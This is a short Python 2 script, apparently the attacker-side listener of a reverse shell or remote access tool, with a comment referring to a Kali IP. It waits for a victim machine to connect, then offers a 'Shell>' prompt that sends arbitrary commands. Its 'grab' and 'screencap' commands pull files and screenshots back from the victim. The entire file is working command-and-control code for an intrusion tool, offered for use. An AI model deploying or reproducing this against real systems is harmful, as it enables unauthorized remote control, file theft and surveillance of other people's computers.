#Basic TCP server
import socket
import os

Host = '127.0.0.1' #Change this to your own host
Port = 8080 #Change this to your own port

def transfer(conn,command):
    conn.send(command)
    null1, null2, destination = command.split(' ')
    f = open( destination,'wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)

def screenshot(conn,command):
    conn.send(command)
    null, destination = command.split(' ')
    f = open( destination,'wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Start a socket objecty s
    s.bind((Host, Port))  #Define the Kali IP and the listing port
    s.listen(1) #definen the backlog size, since we are expecting a single connection

    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept() #accept() fuction will retunr the conneciton object ID

    print('[+] We got a connection from: ', addr)

    while True:
        command = raw_input("Shell> ") #Get user input and store it in command veraibloe

        if 'terminate' in command:
            conn.send(command)
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command)

        elif 'screencap' in command:
            screenshot(conn, command)

        else:
            conn.send(command) #send the command to the server
            print(conn.recv(4096)) #and print the result that wer got back

def main():
    connect()
main()
